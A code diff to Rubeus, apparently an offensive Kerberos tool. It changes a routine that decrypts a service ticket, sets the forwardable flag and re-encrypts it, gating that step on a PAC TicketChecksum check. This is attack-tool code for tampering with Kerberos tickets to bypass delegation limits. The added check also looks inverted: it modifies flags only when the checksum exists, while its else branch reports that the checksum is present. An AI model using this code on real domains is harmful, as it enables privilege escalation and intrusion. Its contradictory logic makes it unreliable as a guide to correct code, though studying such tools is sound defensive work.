@@ -505,14 +505,22 @@ namespace Rubeus
                     ae = AsnElt.Decode(outBytes, false);
                     EncTicketPart decTicketPart = new EncTicketPart(ae.Sub[0]);
 
-                    // modify flags
-                    decTicketPart.flags |= Interop.TicketFlags.forwardable;
+                    // check if the TicketChecksum exists within the PAC
+                    if (decTicketPart.TicketChecksumExists())
+                    {
+                        // modify flags
+                        decTicketPart.flags |= Interop.TicketFlags.forwardable;
 
-                    // encode and encrypt ticket encpart
-                    byte[] encTicketData = decTicketPart.Encode().Encode();
-                    byte[] encTicketPart = Crypto.KerberosEncrypt(encType, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);
-                    rep.ticket.enc_part = new EncryptedData((Int32)encType, encTicketPart, rep.ticket.enc_part.kvno);
-                    Console.WriteLine("[*] Flags changed to: {0}", info.flags);
+                        // encode and encrypt ticket encpart
+                        byte[] encTicketData = decTicketPart.Encode().Encode();
+                        byte[] encTicketPart = Crypto.KerberosEncrypt(encType, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);
+                        rep.ticket.enc_part = new EncryptedData((Int32)encType, encTicketPart, rep.ticket.enc_part.kvno);
+                        Console.WriteLine("[*] Flags changed to: {0}", info.flags);
+                    }
+                    else
+                    {
+                        Console.WriteLine("[!] TicketChecksum is present, modifying ticket flags will not work.");
+                    }
                 }
                 
                 // add the ticket
